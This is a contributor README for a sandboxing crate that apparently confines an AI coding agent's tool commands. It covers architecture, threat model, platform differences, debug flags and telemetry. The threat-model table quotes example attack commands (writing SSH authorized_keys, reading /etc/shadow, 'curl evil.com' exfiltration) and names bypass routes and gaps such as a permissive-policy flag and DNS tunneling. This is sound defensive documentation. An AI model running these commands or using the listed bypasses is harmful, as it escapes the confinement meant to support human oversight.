# `koda-sandbox`

Capability-aware sandbox layer for Koda. Provides:

- **Kernel-level command sandboxing** — Seatbelt on macOS, `bwrap` on Linux.
- **Workspace provisioning** — per-slot writable roots (cwd / git-worktree / APFS clonefile).
- **Egress proxy** — per-session HTTP CONNECT + SOCKS5 proxies with allowlists, optional MITM.
- **Violation tracking** — ring-buffered audit of kernel denials, surfaced to the model.

If you're an end user looking for "what does the sandbox stop me from doing?", read [`docs/src/sandbox.md`](../docs/src/sandbox.md) instead. **This README is for contributors hacking on the crate.**

## Architecture

```text
                         ┌──────────────────────────┐
       koda-core ──────► │  SandboxRuntime  trait   │
       (sub_agent_       │  ┌────────────────────┐  │
        dispatch,        │  │ transform(cmd, …)  │  │   pure: (cmd, policy) → spawnable Command
        bash tool)       │  └────────────────────┘  │
                         └────────────┬─────────────┘
                                      │
                                      ▼
                ┌─────────────────────┴─────────────────────┐
                │                                           │
        ┌───────────────┐                          ┌────────────────┐
        │  Seatbelt     │  macOS                   │  bwrap         │  Linux
        │  backend      │  → sandbox-exec          │  backend       │  → bubblewrap
        └───────┬───────┘                          └────────┬───────┘
                │                                           │
                └────────────────────┬──────────────────────┘
                                     │
                                     ▼ (uses)
                ┌────────────────────────────────────────┐
                │  pool::SandboxPool                     │  per-session worker pool
                │   ↓ acquires SandboxSlot ←─────┐       │
                │     ↑ holds WorkerClient        │      │
                │       (long-lived child proc)   │      │
                │     ↑ holds workspace path      │      │
                │       from WorkspaceProvider ───┘      │
                └────────────────────┬───────────────────┘
                                     │ outbound traffic
                                     ▼
                ┌────────────────────────────────────────┐
                │  proxy::BuiltInProxy                   │  per-session 127.0.0.1:port
                │   + Filter (host allowlist)            │
                │   + UpstreamConfig (corp HTTPS_PROXY)  │
                │   + Socks5Server (raw-TCP fallback)    │
                └────────────────────────────────────────┘
                                     │
                                     ▼
                ┌────────────────────────────────────────┐
                │  violations::SandboxViolationStore     │  ring-buffered denial audit
                └────────────────────────────────────────┘
```

### Key types

| Type | Module | Role |
|---|---|---|
| `SandboxRuntime` (trait) | `lib.rs` | Pure `transform(cmd, policy) → SandboxExecRequest`. Per-platform impls. |
| `SandboxPolicy` | `policy.rs` | Capability schema (filesystem / network / resource / trust). |
| `SandboxPool` | `pool/` | Per-`(writable_root, policy, proxy_port)` worker pool. Warm-acquire ~µs, cold-spawn ~ms. |
| `SandboxSlot` | `pool/` | RAII handle: holds a worker + provisioned workspace. Drop returns to pool. |
| `WorkspaceProvider` (trait) | `workspace.rs` | Abstracts how a slot's writable root is materialized. |
| `CwdProvider` | `workspace.rs` | "Use the cwd as-is" — no isolation. The pre-#934 baseline. |
| `GitWorktreeProvider` | `workspace.rs` | Spawns a git worktree per slot. Cross-platform isolation. |
| `ClonefileProvider` | `workspace.rs` (macOS) | APFS clonefile. Sub-millisecond branch + COW semantics. |
| `BuiltInProxy` | `proxy/server.rs` | Per-session HTTP CONNECT proxy on loopback. Filters by host allowlist. |
| `Socks5Server` | `proxy/socks5.rs` | SOCKS5 fallback for tools that don't honor `HTTPS_PROXY` (raw TCP, ssh-over-git). |
| `UpstreamConfig` | `proxy/upstream.rs` | Snapshots `HTTPS_PROXY` at spawn time so the per-session proxy can chain through corp Squid/Zscaler. |
| `Filter` | `proxy/filter.rs` | Host allowlist enforced by both proxy types. |
| `SandboxViolationStore` | `violations.rs` | Ring buffer of kernel denials. Drives `<sandbox_violations>` stderr annotations to the model. |
| `SandboxRuntime::check_dependencies` | `lib.rs` | Backend health check for `/sandbox status`. |

## Threat model

The sandbox is **a perimeter**, not a sandbox in the security-research sense. Its goal is to give a Koda agent room to execute tools without enabling silent escalation, exfiltration, or footgun damage. It is **not** a hostile-code sandbox.

### What the sandbox *does* defend against

| Threat | Defense |
|---|---|
| Tool writes outside the project root (`echo > ~/.ssh/authorized_keys`) | Seatbelt / bwrap deny + workspace provider scopes writable roots |
| Tool reads system-sensitive paths the policy bans (`cat /etc/shadow`) | Seatbelt / bwrap deny per `FsPolicy.read_paths` |
| Tool exfiltrates over uncontrolled network (`curl evil.com`) | Per-session proxy + host allowlist; raw-TCP path goes through SOCKS5 with the same allowlist |
| Tool spawns a long-running daemon and detaches | Worker process is the parent; killed when slot drops |
| Concurrent slot writes collide on shared filesystem state | Per-slot `WorkspaceProvider` materializes isolated writable roots |
| Operator mis-configures HTTPS_PROXY for the session | `UpstreamConfig` snapshots at spawn time; tests shield with `with_upstream(Direct)` |

### What the sandbox does **not** defend against

| Non-threat | Why |
|---|---|
| Hostile code attempting kernel escapes | Out of scope. Use a VM if you need that level. |
| Side-channel exfiltration (DNS tunneling, ICMP) | Filter is host-based, not packet-inspecting. |
| Read tool / Grep tool reading sensitive files | Reads are intentionally unrestricted (see [`docs/src/sandbox.md`](../docs/src/sandbox.md)). |
| Information disclosure via tool output to operator | Operator has full transcript visibility; this is a UX issue, not a sandbox one. |
| Resource exhaustion (fork bombs, RAM exhaustion) | Limited resource limits via `ResourceLimits`; not comprehensive. Phase 5 deferred fuller resource isolation. |
| Bypass via `KODA_FS_WORKER_BIN` injection | This env var is a developer escape hatch; production deployments should `unset` it. |

### Backend divergence

| Capability | macOS (Seatbelt) | Linux (bwrap) |
|---|---|---|
| Filesystem path scoping | ✅ kernel-enforced | ✅ via mount namespaces |
| Network egress to specific port | ✅ via `(network-outbound (remote tcp …))` | ⚠️  env-var only — `bwrap` doesn't expose port-level filtering. Falls back to `HTTPS_PROXY` injection + warning. |
| Process spawning restrictions | ⚠️  partial — Seatbelt rules exist but aren't currently used | ⚠️  partial — bwrap inherits namespace but doesn't restrict `execve` per-binary |
| Resource limits (CPU/RSS/FDs) | partial via `ulimit`-style wrappers | partial via `prlimit` |

The Linux network-egress gap is tracked as a known limitation; closing it likely needs `slirp4netns` or `rootlesskit`. Phase 3c.1 in #934 carries the design.

## Debug / dev hooks

All env vars are **opt-in**; absence preserves production defaults.

| Env var | Effect |
|---|---|
| `KODA_LOG=info` | Standard `tracing` filter. Phase 5 sandbox events emit at `info` on target `sandbox.acquire` (slot acquisition latency, warm/cold). Use `KODA_LOG=koda_sandbox=debug` for very verbose pool diagnostics. |
| `KODA_FS_WORKER_BIN=/path/to/koda-fs-worker` | Override the FS worker binary location. Used by integration tests and during local development before `cargo install`. **Production should leave this unset.** |
| `KODA_FS_WORKER_LOG=/path/to/log` | Stream the FS worker's stderr to a file instead of inheriting. Useful when debugging worker crashes that get swallowed by IPC framing. |
| `KODA_FS_WORKER_POLICY=permissive` | Spawn the worker without applying the kernel sandbox profile. **Strictly a development convenience for diffing sandbox vs. unsandboxed behavior.** Never use in production. |
| `KODA_SANDBOX_PROXY_PORT_DEBUG=1` | Log the per-session proxy port at startup so an external `curl` can hit it. |
| `KODA_SANDBOX_STAGE=2` | Force a Linux stage-2 re-exec path that's normally only used when bwrap can't be detected. Niche; only relevant for stage2 module debugging. |

## Telemetry

Phase 5 of #934 added two structured-tracing observability hooks. Both are **opt-in via the standard `tracing` subscriber** — no new sinks, no new config.

### Slot acquisition latency

Emitted by `pool::SandboxPool::acquire`:

```rust
tracing::info!(
    target: "sandbox.acquire",
    slot_id = %slot_id,
    latency_us,           // microseconds
    warm = was_warm,      // true = pool hit, false = cold spawn
    "sandbox slot acquired",
);
```

Aggregators that want histograms can build them on the event stream. For local inspection: `KODA_LOG=sandbox.acquire=info`.

### Per-session violation counts

`SandboxViolationStore::count_by_kind() -> HashMap<ViolationKind, usize>` returns a tally over the current ring contents. Cheap (one lock, one pass over ≤100 entries). Designed for `/sandbox status` to call on every invocation.

```rust
let store = sandbox.violations();
for (kind, n) in store.count_by_kind() {
    println!("{kind:?}: {n}");
}
```

## Testing

```sh
cargo test -p koda-sandbox --lib                # unit + integration
cargo bench --bench acquire_slot -p koda-sandbox  # acquisition latency gate
cargo doc -p koda-sandbox --no-deps              # rustdoc — must be -Dwarnings clean
```

The acquire-slot bench enforces a Phase 4 gate of **15 ms warm p95** (current measurement: ~1.4 µs).

### A note on `HTTPS_PROXY` and the proxy tests

The `proxy::server::tests` and `proxy::socks5::tests` modules use loopback fake-upstream servers. If your dev shell has `HTTPS_PROXY` set (e.g. corp network), the proxy under test snapshots it and tries to chain 127.0.0.1 traffic through the corp proxy — returning 502. Tests that need to be immune call `.with_upstream(UpstreamConfig::Direct)` on the proxy after `bind`. The `Socks5Server` shared `spawn()` test helper does this automatically; new tests should follow suit. See #1008 for the rationale.

## Phase status (#934)

| Phase | Status |
|---|---|
| 0–3 | ✅ landed |
| 4a–4d | ✅ landed |
| 4e (Linux CoW workspace provider) | ⏸ deferred — un-defer trigger: latency telemetry shows provisioning dominates `acquire` cost on Linux |
| 4f (lazy provisioning) | ⏸ deferred — un-defer trigger: violation telemetry shows write-heavy workloads concentrate in a small subset of slots |
| 5 item 5 (telemetry) | ✅ landed (this README's `Telemetry` section) |
| 5 item 6 (this README) | ✅ landed |
| 5 items 1–4 (config knobs) | skipped per YAGNI; no evidence of need |

## Pointers

- End-user sandbox docs: [`docs/src/sandbox.md`](../docs/src/sandbox.md)
- Tracking issue with full design + audit trail: [#934](https://github.com/lijunzh/koda/issues/934)
- Approval / trust mode docs: [`docs/src/approval.md`](../docs/src/approval.md)
